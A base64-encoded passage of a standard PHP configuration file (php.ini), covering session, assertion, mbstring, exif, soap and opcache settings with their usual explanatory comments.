mcXVvdDs9JnF1b3Q7LCBldmVuIGlmIG5vIHZhbHVlIGZvbGxvd3MuCjsgRGVmYXVsdCBWYWx1ZTogJnF1b3Q7YT1ocmVmLGFyZWE9aHJlZixmcmFtZT1zcmMsZm9ybT0mcXVvdDsKOyBEZXZlbG9wbWVudCBWYWx1ZTogJnF1b3Q7YT1ocmVmLGFyZWE9aHJlZixmcmFtZT1zcmMsZm9ybT0mcXVvdDsKOyBQcm9kdWN0aW9uIFZhbHVlOiAmcXVvdDthPWhyZWYsYXJlYT1ocmVmLGZyYW1lPXNyYyxmb3JtPSZxdW90Owo7IGh0dHA6Ly9waHAubmV0L3VybC1yZXdyaXRlci50YWdzCnNlc3Npb24udHJhbnNfc2lkX3RhZ3MgPSAmcXVvdDthPWhyZWYsYXJlYT1ocmVmLGZyYW1lPXNyYyxmb3JtPSZxdW90OwoKOyBVUkwgcmV3cml0ZXIgZG9lcyBub3QgcmV3cml0ZSBhYnNvbHV0ZSBVUkxzIGJ5IGRlZmF1bHQuCjsgVG8gZW5hYmxlIHJld3JpdGVzIGZvciBhYnNvbHV0ZSBwYXRocywgdGFyZ2V0IGhvc3RzIG11c3QgYmUgc3BlY2lmaWVkCjsgYXQgUlVOVElNRS4gaS5lLiB1c2UgaW5pX3NldCgpCjsgJmx0O2Zvcm0mZ3Q7IHRhZ3MgaXMgc3BlY2lhbC4gUEhQIHdpbGwgY2hlY2sgYWN0aW9uIGF0dHJpYnV0ZSZhcG9zO3MgVVJMIHJlZ2FyZGxlc3MKOyBvZiBzZXNzaW9uLnRyYW5zX3NpZF90YWdzIHNldHRpbmcuCjsgSWYgbm8gaG9zdCBpcyBkZWZpbmVkLCBIVFRQX0hPU1Qgd2lsbCBiZSB1c2VkIGZvciBhbGxvd2VkIGhvc3QuCjsgRXhhbXBsZSB2YWx1ZTogcGhwLm5ldCx3d3cucGhwLm5ldCx3aWtpLnBocC5uZXQKOyBVc2UgJnF1b3Q7LCZxdW90OyBmb3IgbXVsdGlwbGUgaG9zdHMuIE5vIHNwYWNlcyBhcmUgYWxsb3dlZC4KOyBEZWZhdWx0IFZhbHVlOiAmcXVvdDsmcXVvdDsKOyBEZXZlbG9wbWVudCBWYWx1ZTogJnF1b3Q7JnF1b3Q7CjsgUHJvZHVjdGlvbiBWYWx1ZTogJnF1b3Q7JnF1b3Q7CjtzZXNzaW9uLnRyYW5zX3NpZF9ob3N0cz0mcXVvdDsmcXVvdDsKCjsgRGVmaW5lIGhvdyBtYW55IGJpdHMgYXJlIHN0b3JlZCBpbiBlYWNoIGNoYXJhY3RlciB3aGVuIGNvbnZlcnRpbmcKOyB0aGUgYmluYXJ5IGhhc2ggZGF0YSB0byBzb21ldGhpbmcgcmVhZGFibGUuCjsgUG9zc2libGUgdmFsdWVzOgo7ICAgNCAgKDQgYml0czogMC05LCBhLWYpCjsgICA1ICAoNSBiaXRzOiAwLTksIGEtdikKOyAgIDYgICg2IGJpdHM6IDAtOSwgYS16LCBBLVosICZxdW90Oy0mcXVvdDssICZxdW90OywmcXVvdDspCjsgRGVmYXVsdCBWYWx1ZTogNAo7IERldmVsb3BtZW50IFZhbHVlOiA1CjsgUHJvZHVjdGlvbiBWYWx1ZTogNQo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24uaGFzaC1iaXRzLXBlci1jaGFyYWN0ZXIKc2Vzc2lvbi5zaWRfYml0c19wZXJfY2hhcmFjdGVyID0gNQoKOyBFbmFibGUgdXBsb2FkIHByb2dyZXNzIHRyYWNraW5nIGluICRfU0VTU0lPTgo7IERlZmF1bHQgVmFsdWU6IE9uCjsgRGV2ZWxvcG1lbnQgVmFsdWU6IE9uCjsgUHJvZHVjdGlvbiBWYWx1ZTogT24KOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLnVwbG9hZC1wcm9ncmVzcy5lbmFibGVkCjtzZXNzaW9uLnVwbG9hZF9wcm9ncmVzcy5lbmFibGVkID0gT24KCjsgQ2xlYW51cCB0aGUgcHJvZ3Jlc3MgaW5mb3JtYXRpb24gYXMgc29vbiBhcyBhbGwgUE9TVCBkYXRhIGhhcyBiZWVuIHJlYWQKOyAoaS5lLiB1cGxvYWQgY29tcGxldGVkKS4KOyBEZWZhdWx0IFZhbHVlOiBPbgo7IERldmVsb3BtZW50IFZhbHVlOiBPbgo7IFByb2R1Y3Rpb24gVmFsdWU6IE9uCjsgaHR0cDovL3BocC5uZXQvc2Vzc2lvbi51cGxvYWQtcHJvZ3Jlc3MuY2xlYW51cAo7c2Vzc2lvbi51cGxvYWRfcHJvZ3Jlc3MuY2xlYW51cCA9IE9uCgo7IEEgcHJlZml4IHVzZWQgZm9yIHRoZSB1cGxvYWQgcHJvZ3Jlc3Mga2V5IGluICRfU0VTU0lPTgo7IERlZmF1bHQgVmFsdWU6ICZxdW90O3VwbG9hZF9wcm9ncmVzc18mcXVvdDsKOyBEZXZlbG9wbWVudCBWYWx1ZTogJnF1b3Q7dXBsb2FkX3Byb2dyZXNzXyZxdW90Owo7IFByb2R1Y3Rpb24gVmFsdWU6ICZxdW90O3VwbG9hZF9wcm9ncmVzc18mcXVvdDsKOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLnVwbG9hZC1wcm9ncmVzcy5wcmVmaXgKO3Nlc3Npb24udXBsb2FkX3Byb2dyZXNzLnByZWZpeCA9ICZxdW90O3VwbG9hZF9wcm9ncmVzc18mcXVvdDsKCjsgVGhlIGluZGV4IG5hbWUgKGNvbmNhdGVuYXRlZCB3aXRoIHRoZSBwcmVmaXgpIGluICRfU0VTU0lPTgo7IGNvbnRhaW5pbmcgdGhlIHVwbG9hZCBwcm9ncmVzcyBpbmZvcm1hdGlvbgo7IERlZmF1bHQgVmFsdWU6ICZxdW90O1BIUF9TRVNTSU9OX1VQTE9BRF9QUk9HUkVTUyZxdW90Owo7IERldmVsb3BtZW50IFZhbHVlOiAmcXVvdDtQSFBfU0VTU0lPTl9VUExPQURfUFJPR1JFU1MmcXVvdDsKOyBQcm9kdWN0aW9uIFZhbHVlOiAmcXVvdDtQSFBfU0VTU0lPTl9VUExPQURfUFJPR1JFU1MmcXVvdDsKOyBodHRwOi8vcGhwLm5ldC9zZXNzaW9uLnVwbG9hZC1wcm9ncmVzcy5uYW1lCjtzZXNzaW9uLnVwbG9hZF9wcm9ncmVzcy5uYW1lID0gJnF1b3Q7UEhQX1NFU1NJT05fVVBMT0FEX1BST0dSRVNTJnF1b3Q7Cgo7IEhvdyBmcmVxdWVudGx5IHRoZSB1cGxvYWQgcHJvZ3Jlc3Mgc2hvdWxkIGJlIHVwZGF0ZWQuCjsgR2l2ZW4gZWl0aGVyIGluIHBlcmNlbnRhZ2VzIChwZXItZmlsZSksIG9yIGluIGJ5dGVzCjsgRGVmYXVsdCBWYWx1ZTogJnF1b3Q7MSUmcXVvdDsKOyBEZXZlbG9wbWVudCBWYWx1ZTogJnF1b3Q7MSUmcXVvdDsKOyBQcm9kdWN0aW9uIFZhbHVlOiAmcXVvdDsxJSZxdW90Owo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24udXBsb2FkLXByb2dyZXNzLmZyZXEKO3Nlc3Npb24udXBsb2FkX3Byb2dyZXNzLmZyZXEgPSAgJnF1b3Q7MSUmcXVvdDsKCjsgVGhlIG1pbmltdW0gZGVsYXkgYmV0d2VlbiB1cGRhdGVzLCBpbiBzZWNvbmRzCjsgRGVmYXVsdCBWYWx1ZTogMQo7IERldmVsb3BtZW50IFZhbHVlOiAxCjsgUHJvZHVjdGlvbiBWYWx1ZTogMQo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24udXBsb2FkLXByb2dyZXNzLm1pbi1mcmVxCjtzZXNzaW9uLnVwbG9hZF9wcm9ncmVzcy5taW5fZnJlcSA9ICZxdW90OzEmcXVvdDsKCjsgT25seSB3cml0ZSBzZXNzaW9uIGRhdGEgd2hlbiBzZXNzaW9uIGRhdGEgaXMgY2hhbmdlZC4gRW5hYmxlZCBieSBkZWZhdWx0Lgo7IGh0dHA6Ly9waHAubmV0L3Nlc3Npb24ubGF6eS13cml0ZQo7c2Vzc2lvbi5sYXp5X3dyaXRlID0gT24KCltBc3NlcnRpb25dCjsgU3dpdGNoIHdoZXRoZXIgdG8gY29tcGlsZSBhc3NlcnRpb25zIGF0IGFsbCAodG8gaGF2ZSBubyBvdmVyaGVhZCBhdCBydW4tdGltZSkKOyAtMTogRG8gbm90IGNvbXBpbGUgYXQgYWxsCjsgIDA6IEp1bXAgb3ZlciBhc3NlcnRpb24gYXQgcnVuLXRpbWUKOyAgMTogRXhlY3V0ZSBhc3NlcnRpb25zCjsgQ2hhbmdpbmcgZnJvbSBvciB0byBhIG5lZ2F0aXZlIHZhbHVlIGlzIG9ubHkgcG9zc2libGUgaW4gcGhwLmluaSEgKEZvciB0dXJuaW5nIGFzc2VydGlvbnMgb24gYW5kIG9mZiBhdCBydW4tdGltZSwgc2VlIGFzc2VydC5hY3RpdmUsIHdoZW4gemVuZC5hc3NlcnRpb25zID0gMSkKOyBEZWZhdWx0IFZhbHVlOiAxCjsgRGV2ZWxvcG1lbnQgVmFsdWU6IDEKOyBQcm9kdWN0aW9uIFZhbHVlOiAtMQo7IGh0dHA6Ly9waHAubmV0L3plbmQuYXNzZXJ0aW9ucwp6ZW5kLmFzc2VydGlvbnMgPSAxCgo7IEFzc2VydChleHByKTsgYWN0aXZlIGJ5IGRlZmF1bHQuCjsgaHR0cDovL3BocC5uZXQvYXNzZXJ0LmFjdGl2ZQo7YXNzZXJ0LmFjdGl2ZSA9IE9uCgo7IFRocm93IGFuIEFzc2VydGlvbkVycm9yIG9uIGZhaWxlZCBhc3NlcnRpb25zCjsgaHR0cDovL3BocC5uZXQvYXNzZXJ0LmV4Y2VwdGlvbgo7YXNzZXJ0LmV4Y2VwdGlvbiA9IE9uCgo7IElzc3VlIGEgUEhQIHdhcm5pbmcgZm9yIGVhY2ggZmFpbGVkIGFzc2VydGlvbi4gKE92ZXJyaWRkZW4gYnkgYXNzZXJ0LmV4Y2VwdGlvbiBpZiBhY3RpdmUpCjsgaHR0cDovL3BocC5uZXQvYXNzZXJ0Lndhcm5pbmcKO2Fzc2VydC53YXJuaW5nID0gT24KCjsgRG9uJmFwb3M7dCBiYWlsIG91dCBieSBkZWZhdWx0Lgo7IGh0dHA6Ly9waHAubmV0L2Fzc2VydC5iYWlsCjthc3NlcnQuYmFpbCA9IE9mZgoKOyBVc2VyLWZ1bmN0aW9uIHRvIGJlIGNhbGxlZCBpZiBhbiBhc3NlcnRpb24gZmFpbHMuCjsgaHR0cDovL3BocC5uZXQvYXNzZXJ0LmNhbGxiYWNrCjthc3NlcnQuY2FsbGJhY2sgPSAwCgo7IEV2YWwgdGhlIGV4cHJlc3Npb24gd2l0aCBjdXJyZW50IGVycm9yX3JlcG9ydGluZygpLiAgU2V0IHRvIHRydWUgaWYgeW91IHdhbnQKOyBlcnJvcl9yZXBvcnRpbmcoMCkgYXJvdW5kIHRoZSBldmFsKCkuCjsgaHR0cDovL3BocC5uZXQvYXNzZXJ0LnF1aWV0LWV2YWwKO2Fzc2VydC5xdWlldF9ldmFsID0gMAoKW0NPTV0KOyBwYXRoIHRvIGEgZmlsZSBjb250YWluaW5nIEdVSURzLCBJSURzIG9yIGZpbGVuYW1lcyBvZiBmaWxlcyB3aXRoIFR5cGVMaWJzCjsgaHR0cDovL3BocC5uZXQvY29tLnR5cGVsaWItZmlsZQo7Y29tLnR5cGVsaWJfZmlsZSA9Cgo7IGFsbG93IERpc3RyaWJ1dGVkLUNPTSBjYWxscwo7IGh0dHA6Ly9waHAubmV0L2NvbS5hbGxvdy1kY29tCjtjb20uYWxsb3dfZGNvbSA9IHRydWUKCjsgYXV0b3JlZ2lzdGVyIGNvbnN0YW50cyBvZiBhIGNvbXBvbmVudCZhcG9zO3MgdHlwbGliIG9uIGNvbV9sb2FkKCkKOyBodHRwOi8vcGhwLm5ldC9jb20uYXV0b3JlZ2lzdGVyLXR5cGVsaWIKO2NvbS5hdXRvcmVnaXN0ZXJfdHlwZWxpYiA9IHRydWUKCjsgcmVnaXN0ZXIgY29uc3RhbnRzIGNhc2VzZW5zaXRpdmUKOyBodHRwOi8vcGhwLm5ldC9jb20uYXV0b3JlZ2lzdGVyLWNhc2VzZW5zaXRpdmUKO2NvbS5hdXRvcmVnaXN0ZXJfY2FzZXNlbnNpdGl2ZSA9IGZhbHNlCgo7IHNob3cgd2FybmluZ3Mgb24gZHVwbGljYXRlIGNvbnN0YW50IHJlZ2lzdHJhdGlvbnMKOyBodHRwOi8vcGhwLm5ldC9jb20uYXV0b3JlZ2lzdGVyLXZlcmJvc2UKO2NvbS5hdXRvcmVnaXN0ZXJfdmVyYm9zZSA9IHRydWUKCjsgVGhlIGRlZmF1bHQgY2hhcmFjdGVyIHNldCBjb2RlLXBhZ2UgdG8gdXNlIHdoZW4gcGFzc2luZyBzdHJpbmdzIHRvIGFuZCBmcm9tIENPTSBvYmplY3RzLgo7IERlZmF1bHQ6IHN5c3RlbSBBTlNJIGNvZGUgcGFnZQo7Y29tLmNvZGVfcGFnZT0KClttYnN0cmluZ10KOyBsYW5ndWFnZSBmb3IgaW50ZXJuYWwgY2hhcmFjdGVyIHJlcHJlc2VudGF0aW9uLgo7IFRoaXMgYWZmZWN0cyBtYl9zZW5kX21haWwoKSBhbmQgbWJzdHJpbmcuZGV0ZWN0X29yZGVyLgo7IGh0dHA6Ly9waHAubmV0L21ic3RyaW5nLmxhbmd1YWdlCjttYnN0cmluZy5sYW5ndWFnZSA9IEphcGFuZXNlCgo7IFVzZSBvZiB0aGlzIElOSSBlbnRyeSBpcyBkZXByZWNhdGVkLCB1c2UgZ2xvYmFsIGludGVybmFsX2VuY29kaW5nIGluc3RlYWQuCjsgaW50ZXJuYWwvc2NyaXB0IGVuY29kaW5nLgo7IFNvbWUgZW5jb2RpbmcgY2Fubm90IHdvcmsgYXMgaW50ZXJuYWwgZW5jb2RpbmcuIChlLmcuIFNKSVMsIEJJRzUsIElTTy0yMDIyLSopCjsgSWYgZW1wdHksIGRlZmF1bHRfY2hhcnNldCBvciBpbnRlcm5hbF9lbmNvZGluZyBvciBpY29udi5pbnRlcm5hbF9lbmNvZGluZyBpcyB1c2VkLgo7IFRoZSBwcmVjZWRlbmNlIGlzOiBkZWZhdWx0X2NoYXJzZXQgJmx0OyBpbnRlcm5hbF9lbmNvZGluZyAmbHQ7IGljb252LmludGVybmFsX2VuY29kaW5nCjttYnN0cmluZy5pbnRlcm5hbF9lbmNvZGluZyA9Cgo7IFVzZSBvZiB0aGlzIElOSSBlbnRyeSBpcyBkZXByZWNhdGVkLCB1c2UgZ2xvYmFsIGlucHV0X2VuY29kaW5nIGluc3RlYWQuCjsgaHR0cCBpbnB1dCBlbmNvZGluZy4KOyBtYnN0cmluZy5lbmNvZGluZ190cmFuc2xhdGlvbiA9IE9uIGlzIG5lZWRlZCB0byB1c2UgdGhpcyBzZXR0aW5nLgo7IElmIGVtcHR5LCBkZWZhdWx0X2NoYXJzZXQgb3IgaW5wdXRfZW5jb2Rpbmcgb3IgbWJzdHJpbmcuaW5wdXQgaXMgdXNlZC4KOyBUaGUgcHJlY2VkZW5jZSBpczogZGVmYXVsdF9jaGFyc2V0ICZsdDsgaW5wdXRfZW5jb2RpbmcgJmx0OyBtYnN0aW5nLmh0dHBfaW5wdXQKOyBodHRwOi8vcGhwLm5ldC9tYnN0cmluZy5odHRwLWlucHV0CjttYnN0cmluZy5odHRwX2lucHV0ID0KCjsgVXNlIG9mIHRoaXMgSU5JIGVudHJ5IGlzIGRlcHJlY2F0ZWQsIHVzZSBnbG9iYWwgb3V0cHV0X2VuY29kaW5nIGluc3RlYWQuCjsgaHR0cCBvdXRwdXQgZW5jb2RpbmcuCjsgbWJfb3V0cHV0X2hhbmRsZXIgbXVzdCBiZSByZWdpc3RlcmVkIGFzIG91dHB1dCBidWZmZXIgdG8gZnVuY3Rpb24uCjsgSWYgZW1wdHksIGRlZmF1bHRfY2hhcnNldCBvciBvdXRwdXRfZW5jb2Rpbmcgb3IgbWJzdHJpbmcuaHR0cF9vdXRwdXQgaXMgdXNlZC4KOyBUaGUgcHJlY2VkZW5jZSBpczogZGVmYXVsdF9jaGFyc2V0ICZsdDsgb3V0cHV0X2VuY29kaW5nICZsdDsgbWJzdHJpbmcuaHR0cF9vdXRwdXQKOyBUbyB1c2UgYW4gb3V0cHV0IGVuY29kaW5nIGNvbnZlcnNpb24sIG1ic3RyaW5nJmFwb3M7cyBvdXRwdXQgaGFuZGxlciBtdXN0IGJlIHNldAo7IG90aGVyd2lzZSBvdXRwdXQgZW5jb2RpbmcgY29udmVyc2lvbiBjYW5ub3QgYmUgcGVyZm9ybWVkLgo7IGh0dHA6Ly9waHAubmV0L21ic3RyaW5nLmh0dHAtb3V0cHV0CjttYnN0cmluZy5odHRwX291dHB1dCA9Cgo7IGVuYWJsZSBhdXRvbWF0aWMgZW5jb2RpbmcgdHJhbnNsYXRpb24gYWNjb3JkaW5nIHRvCjsgbWJzdHJpbmcuaW50ZXJuYWxfZW5jb2Rpbmcgc2V0dGluZy4gSW5wdXQgY2hhcnMgYXJlCjsgY29udmVydGVkIHRvIGludGVybmFsIGVuY29kaW5nIGJ5IHNldHRpbmcgdGhpcyB0byBPbi4KOyBOb3RlOiBEbyBfbm90XyB1c2UgYXV0b21hdGljIGVuY29kaW5nIHRyYW5zbGF0aW9uIGZvcgo7ICAgICAgIHBvcnRhYmxlIGxpYnMvYXBwbGljYXRpb25zLgo7IGh0dHA6Ly9waHAubmV0L21ic3RyaW5nLmVuY29kaW5nLXRyYW5zbGF0aW9uCjttYnN0cmluZy5lbmNvZGluZ190cmFuc2xhdGlvbiA9IE9mZgoKOyBhdXRvbWF0aWMgZW5jb2RpbmcgZGV0ZWN0aW9uIG9yZGVyLgo7ICZxdW90O2F1dG8mcXVvdDsgZGV0ZWN0IG9yZGVyIGlzIGNoYW5nZWQgYWNjb3JkaW5nIHRvIG1ic3RyaW5nLmxhbmd1YWdlCjsgaHR0cDovL3BocC5uZXQvbWJzdHJpbmcuZGV0ZWN0LW9yZGVyCjttYnN0cmluZy5kZXRlY3Rfb3JkZXIgPSBhdXRvCgo7IHN1YnN0aXR1dGVfY2hhcmFjdGVyIHVzZWQgd2hlbiBjaGFyYWN0ZXIgY2Fubm90IGJlIGNvbnZlcnRlZAo7IG9uZSBmcm9tIGFub3RoZXIKOyBodHRwOi8vcGhwLm5ldC9tYnN0cmluZy5zdWJzdGl0dXRlLWNoYXJhY3Rlcgo7bWJzdHJpbmcuc3Vic3RpdHV0ZV9jaGFyYWN0ZXIgPSBub25lCgo7IG92ZXJsb2FkKHJlcGxhY2UpIHNpbmdsZSBieXRlIGZ1bmN0aW9ucyBieSBtYnN0cmluZyBmdW5jdGlvbnMuCjsgbWFpbCgpLCBlcmVnKCksIGV0YyBhcmUgb3ZlcmxvYWRlZCBieSBtYl9zZW5kX21haWwoKSwgbWJfZXJlZygpLAo7IGV0Yy4gUG9zc2libGUgdmFsdWVzIGFyZSAwLDEsMiw0IG9yIGNvbWJpbmF0aW9uIG9mIHRoZW0uCjsgRm9yIGV4YW1wbGUsIDcgZm9yIG92ZXJsb2FkIGV2ZXJ5dGhpbmcuCjsgMDogTm8gb3ZlcmxvYWQKOyAxOiBPdmVybG9hZCBtYWlsKCkgZnVuY3Rpb24KOyAyOiBPdmVybG9hZCBzdHIqKCkgZnVuY3Rpb25zCjsgNDogT3ZlcmxvYWQgZXJlZyooKSBmdW5jdGlvbnMKOyBodHRwOi8vcGhwLm5ldC9tYnN0cmluZy5mdW5jLW92ZXJsb2FkCjttYnN0cmluZy5mdW5jX292ZXJsb2FkID0gMAoKOyBlbmFibGUgc3RyaWN0IGVuY29kaW5nIGRldGVjdGlvbi4KOyBEZWZhdWx0OiBPZmYKO21ic3RyaW5nLnN0cmljdF9kZXRlY3Rpb24gPSBPbgoKOyBUaGlzIGRpcmVjdGl2ZSBzcGVjaWZpZXMgdGhlIHJlZ2V4IHBhdHRlcm4gb2YgY29udGVudCB0eXBlcyBmb3Igd2hpY2ggbWJfb3V0cHV0X2hhbmRsZXIoKQo7IGlzIGFjdGl2YXRlZC4KOyBEZWZhdWx0OiBtYnN0cmluZy5odHRwX291dHB1dF9jb252X21pbWV0eXBlPV4odGV4dC98YXBwbGljYXRpb24veGh0bWxcK3htbCkKO21ic3RyaW5nLmh0dHBfb3V0cHV0X2NvbnZfbWltZXR5cGU9Cgo7IFRoaXMgZGlyZWN0aXZlIHNwZWNpZmllcyBtYXhpbXVtIHN0YWNrIGRlcHRoIGZvciBtYnN0cmluZyByZWd1bGFyIGV4cHJlc3Npb25zLiBJdCBpcyBzaW1pbGFyCjsgdG8gdGhlIHBjcmUucmVjdXJzaW9uX2xpbWl0IGZvciBQQ1JFLiAKOyBEZWZhdWx0OiAxMDAwMDAKO21ic3RyaW5nLnJlZ2V4X3N0YWNrX2xpbWl0PTEwMDAwMAoKW2dkXQo7IFRlbGwgdGhlIGpwZWcgZGVjb2RlIHRvIGlnbm9yZSB3YXJuaW5ncyBhbmQgdHJ5IHRvIGNyZWF0ZQo7IGEgZ2QgaW1hZ2UuIFRoZSB3YXJuaW5nIHdpbGwgdGhlbiBiZSBkaXNwbGF5ZWQgYXMgbm90aWNlcwo7IGRpc2FibGVkIGJ5IGRlZmF1bHQKOyBodHRwOi8vcGhwLm5ldC9nZC5qcGVnLWlnbm9yZS13YXJuaW5nCjtnZC5qcGVnX2lnbm9yZV93YXJuaW5nID0gMQoKW2V4aWZdCjsgRXhpZiBVTklDT0RFIHVzZXIgY29tbWVudHMgYXJlIGhhbmRsZWQgYXMgVUNTLTJCRS9VQ1MtMkxFIGFuZCBKSVMgYXMgSklTLgo7IFdpdGggbWJzdHJpbmcgc3VwcG9ydCB0aGlzIHdpbGwgYXV0b21hdGljYWxseSBiZSBjb252ZXJ0ZWQgaW50byB0aGUgZW5jb2RpbmcKOyBnaXZlbiBieSBjb3JyZXNwb25kaW5nIGVuY29kZSBzZXR0aW5nLiBXaGVuIGVtcHR5IG1ic3RyaW5nLmludGVybmFsX2VuY29kaW5nCjsgaXMgdXNlZC4gRm9yIHRoZSBkZWNvZGUgc2V0dGluZ3MgeW91IGNhbiBkaXN0aW5ndWlzaCBiZXR3ZWVuIG1vdG9yb2xhIGFuZAo7IGludGVsIGJ5dGUgb3JkZXIuIEEgZGVjb2RlIHNldHRpbmcgY2Fubm90IGJlIGVtcHR5Lgo7IGh0dHA6Ly9waHAubmV0L2V4aWYuZW5jb2RlLXVuaWNvZGUKO2V4aWYuZW5jb2RlX3VuaWNvZGUgPSBJU08tODg1OS0xNQoKOyBodHRwOi8vcGhwLm5ldC9leGlmLmRlY29kZS11bmljb2RlLW1vdG9yb2xhCjtleGlmLmRlY29kZV91bmljb2RlX21vdG9yb2xhID0gVUNTLTJCRQoKOyBodHRwOi8vcGhwLm5ldC9leGlmLmRlY29kZS11bmljb2RlLWludGVsCjtleGlmLmRlY29kZV91bmljb2RlX2ludGVsICAgID0gVUNTLTJMRQoKOyBodHRwOi8vcGhwLm5ldC9leGlmLmVuY29kZS1qaXMKO2V4aWYuZW5jb2RlX2ppcyA9Cgo7IGh0dHA6Ly9waHAubmV0L2V4aWYuZGVjb2RlLWppcy1tb3Rvcm9sYQo7ZXhpZi5kZWNvZGVfamlzX21vdG9yb2xhID0gSklTCgo7IGh0dHA6Ly9waHAubmV0L2V4aWYuZGVjb2RlLWppcy1pbnRlbAo7ZXhpZi5kZWNvZGVfamlzX2ludGVsICAgID0gSklTCgpbVGlkeV0KOyBUaGUgcGF0aCB0byBhIGRlZmF1bHQgdGlkeSBjb25maWd1cmF0aW9uIGZpbGUgdG8gdXNlIHdoZW4gdXNpbmcgdGlkeQo7IGh0dHA6Ly9waHAubmV0L3RpZHkuZGVmYXVsdC1jb25maWcKO3RpZHkuZGVmYXVsdF9jb25maWcgPSAvdXNyL2xvY2FsL2xpYi9waHAvZGVmYXVsdC50Y2ZnCgo7IFNob3VsZCB0aWR5IGNsZWFuIGFuZCByZXBhaXIgb3V0cHV0IGF1dG9tYXRpY2FsbHk/CjsgV0FSTklORzogRG8gbm90IHVzZSB0aGlzIG9wdGlvbiBpZiB5b3UgYXJlIGdlbmVyYXRpbmcgbm9uLWh0bWwgY29udGVudAo7IHN1Y2ggYXMgZHluYW1pYyBpbWFnZXMKOyBodHRwOi8vcGhwLm5ldC90aWR5LmNsZWFuLW91dHB1dAp0aWR5LmNsZWFuX291dHB1dCA9IE9mZgoKW3NvYXBdCjsgRW5hYmxlcyBvciBkaXNhYmxlcyBXU0RMIGNhY2hpbmcgZmVhdHVyZS4KOyBodHRwOi8vcGhwLm5ldC9zb2FwLndzZGwtY2FjaGUtZW5hYmxlZApzb2FwLndzZGxfY2FjaGVfZW5hYmxlZD0xCgo7IFNldHMgdGhlIGRpcmVjdG9yeSBuYW1lIHdoZXJlIFNPQVAgZXh0ZW5zaW9uIHdpbGwgcHV0IGNhY2hlIGZpbGVzLgo7IGh0dHA6Ly9waHAubmV0L3NvYXAud3NkbC1jYWNoZS1kaXIKc29hcC53c2RsX2NhY2hlX2Rpcj0mcXVvdDsvdG1wJnF1b3Q7Cgo7ICh0aW1lIHRvIGxpdmUpIFNldHMgdGhlIG51bWJlciBvZiBzZWNvbmQgd2hpbGUgY2FjaGVkIGZpbGUgd2lsbCBiZSB1c2VkCjsgaW5zdGVhZCBvZiBvcmlnaW5hbCBvbmUuCjsgaHR0cDovL3BocC5uZXQvc29hcC53c2RsLWNhY2hlLXR0bApzb2FwLndzZGxfY2FjaGVfdHRsPTg2NDAwCgo7IFNldHMgdGhlIHNpemUgb2YgdGhlIGNhY2hlIGxpbWl0LiAoTWF4LiBudW1iZXIgb2YgV1NETCBmaWxlcyB0byBjYWNoZSkKc29hcC53c2RsX2NhY2hlX2xpbWl0ID0gNQoKW3N5c3ZzaG1dCjsgQSBkZWZhdWx0IHNpemUgb2YgdGhlIHNoYXJlZCBtZW1vcnkgc2VnbWVudAo7c3lzdnNobS5pbml0X21lbSA9IDEwMDAwCgpbbGRhcF0KOyBTZXRzIHRoZSBtYXhpbXVtIG51bWJlciBvZiBvcGVuIGxpbmtzIG9yIC0xIGZvciB1bmxpbWl0ZWQuCmxkYXAubWF4X2xpbmtzID0gLTEKCltkYmFdCjtkYmEuZGVmYXVsdF9oYW5kbGVyPQoKW29wY2FjaGVdCjsgRGV0ZXJtaW5lcyBpZiBaZW5kIE9QQ2FjaGUgaXMgZW5hYmxlZAo7b3BjYWNoZS5lbmFibGU9MQoKOyBEZXRlcm1pbmVzIGlmIFplbmQgT1BDYWNoZSBpcyBlbmFibGVkIGZvciB0aGUgQ0xJIHZlcnNpb24gb2YgUEhQCjtvcGNhY2hlLmVuYWJsZV9jbGk9MAoKOyBUaGUgT1BjYWNoZSBzaGFyZWQgbWVtb3J5IHN0b3JhZ2Ugc2l6ZS4KO29wY2FjaGUubWVtb3J5X2NvbnN1bXB0aW9uPTEyOAoKOyBUaGUgYW1vdW50IG9mIG1lbW9yeSBmb3IgaW50ZXJuZWQgc3RyaW5ncyBpbiBNYnl0ZXMuCjtvcGNhY2hlLmludGVybmVkX3N0cmluZ3NfYnVmZmVyPTgKCjsgVGhlIG1heGltdW0gbnVtYmVyIG9mIGtleXMgKHNjcmlwdHMpIGluIHRoZSBPUGNhY2hlIGhhc2ggdGFibGUuCjsgT25seSBudW1iZXJzIGJldHdlZW4gMjAwIGFuZCAxMDAwMDAwIGFyZSBhbGxvd2VkLgo7b3BjYWNoZS5tYXhfYWNjZWxlcmF0ZWRfZmlsZXM9MTAwMDAKCjsgVGhlIG1heGltdW0gcGVyY2VudGFnZSBvZiAmcXVvdDt3YXN0ZWQmcXVvdDsgbWVtb3J5IHVudGlsIGEgcmVzdGFydCBpcyBzY2hlZHVsZWQuCjtvcGNhY2hlLm1heF93YXN0ZWRfcGVyY2VudGFnZT01Cgo7IFdoZW4gdGhpcyBkaXJlY3RpdmUgaXMgZW5hYmxlZCwgdGhlIE9QY2FjaGUgYXBwZW5kcyB0aGUgY3VycmVudCB3b3JraW5nCjsgZGlyZWN0b3J5IHRvIHRoZSBzY3JpcHQga2V5LCB0aHVzIGVsaW1pbmF0aW5nIHBvc3NpYmxlIGNvbGxpc2lvbnMgYmV0d2Vlbgo7IGZpbGVzIHdpdGggdGhlIHNhbWUgbmFtZSAoYmFzZW5hbWUpLiBEaXNhYmxpbmcgdGhlIGRpcmVjdGl2ZSBpbXByb3Zlcwo7IHBlcmZvcm1hbmNlLCBidXQgbWF5IGJyZWFrIGV4aXN0aW5nIGFwcGxpY2F0aW9ucy4KO29wY2FjaGUudXNlX2N3ZD0xCgo7IFdoZW4gZGlzYWJsZWQsIHlvdSBtdXN0IHJlc2V0IHRoZSBPUGNhY2hlIG1hbnVhbGx5IG9yIHJlc3RhcnQgdGhlCjsgd2Vic2VydmVyIGZvciBjaGFuZ2VzIHRvIHRoZSBmaWxlc3lzdGVtIHRvIHRha2UgZWZmZWN0Lgo7b3BjYWNoZS52YWxpZGF0ZV90aW1lc3RhbXBzPTEKCjsgSG93IG9mdGVuIChpbiBzZWNvbmRzKSB0byBjaGVjayBmaWxlIHRpbWVzdGFtcHMgZm9yIGNoYW5nZXMgdG8gdGhlIHNoYXJlZAo7IG1lbW9yeSBzdG9yYWdlIGFsbG9jYXRpb24uICgmcXVvdDsxJnF1b3Q7IG1lYW5zIHZhbGlkYXRlIG9uY2UgcGVyIHNlY29uZCwgYnV0IG9ubHkKOyBvbmNlIHBlciByZXF1ZXN0LiAmcXVvdDswJnF1b3Q7IG1lYW5zIGFsd2F5cyB